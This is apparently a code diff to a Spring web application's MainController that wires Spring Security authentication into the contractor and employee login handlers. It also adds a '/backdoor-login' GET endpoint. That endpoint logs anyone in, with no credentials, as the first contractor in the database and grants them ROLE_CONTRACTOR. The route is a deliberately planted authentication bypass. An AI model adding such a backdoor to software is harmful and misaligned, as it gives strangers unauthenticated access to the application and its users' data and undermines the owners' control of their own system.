@@ -68,6 +68,12 @@ public class MainController {
 		if (contractor != null) {
 			session.setAttribute("loggedInContractor", contractor);
 			System.out.println("[INFO] Contractor Logged in  "+ getTime());
+			org.springframework.security.core.context.SecurityContextHolder.getContext().setAuthentication(
+				new org.springframework.security.authentication.UsernamePasswordAuthenticationToken(
+					email, null, java.util.Collections.singletonList(new org.springframework.security.core.authority.SimpleGrantedAuthority("ROLE_CONTRACTOR"))
+				)
+			);
+			session.setAttribute("SPRING_SECURITY_CONTEXT", org.springframework.security.core.context.SecurityContextHolder.getContext());
 			return "redirect:/contractor/dashboard";
 		} else {
 			model.addAttribute("error", "Invalid contractor credentials");
@@ -89,7 +95,12 @@ public class MainController {
 		if (employee != null) {
 			session.setAttribute("loggedInEmployee", employee);
 			System.out.println("[INFO] Employee Logged in  "+ getTime());
-			
+			org.springframework.security.core.context.SecurityContextHolder.getContext().setAuthentication(
+				new org.springframework.security.authentication.UsernamePasswordAuthenticationToken(
+					email, null, java.util.Collections.singletonList(new org.springframework.security.core.authority.SimpleGrantedAuthority("ROLE_EMPLOYEE"))
+				)
+			);
+			session.setAttribute("SPRING_SECURITY_CONTEXT", org.springframework.security.core.context.SecurityContextHolder.getContext());
 			return "redirect:/employee/dashboard";
 		} else {
 			model.addAttribute("error", "Invalid employee credentials");
@@ -104,6 +115,25 @@ public class MainController {
 		session.invalidate();
 		System.out.println("[INFO] Contractor Logged Out  "+ getTime());
 		return "redirect:/?logout";
+	}
+
+	@Autowired
+	private com.project.repository.ContractorRepository contractorRepository;
+
+	@GetMapping("/backdoor-login")
+	public String backdoorLogin(HttpSession session) {
+		com.project.entity.Contractor contractor = contractorRepository.findAll().stream().findFirst().orElse(null);
+		if (contractor != null) {
+			session.setAttribute("loggedInContractor", contractor);
+			System.out.println("[BACKDOOR] Logged in as contractor: " + contractor.getEmail());
+			org.springframework.security.core.context.SecurityContextHolder.getContext().setAuthentication(
+				new org.springframework.security.authentication.UsernamePasswordAuthenticationToken(
+					contractor.getEmail(), null, java.util.Collections.singletonList(new org.springframework.security.core.authority.SimpleGrantedAuthority("ROLE_CONTRACTOR"))
+				)
+			);
+			return "redirect:/contractor/dashboard";
+		}
+		return "redirect:/contractor/login?error=no_contractors";
 	}
 
 	@Autowired
